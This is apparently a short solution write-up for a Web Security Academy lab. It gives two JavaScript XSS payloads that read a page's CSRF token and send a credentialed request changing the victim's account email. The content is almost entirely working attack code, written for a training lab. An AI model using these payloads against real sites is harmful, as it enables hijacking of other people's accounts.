### Solved using:

```
<script>
function changeMail(token){
 var xhr = new XMLHttpRequest();
 var url = "https://ac0d1f601e638e96800626ab009400f2.web-security-academy.net/email/change-email";
 var params = {"email":"malice@hacker.site","csrf":token};

 xhr.open("POST", url, true);
 xhr.withCredentials = 'true';
 xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
 queryParams = Object.keys(params).reduce(function(a,k){
  a.push(k + '=' + encodeURIComponent(params[k]));
  return a
 }, []).join('&');

 xhr.send(queryParams);
}
window.onload = function() {
var token = document.getElementsByName("csrf")[0].value;
    
changeMail(token);
};

</script>
```

### Solution:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/email/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script> 
```
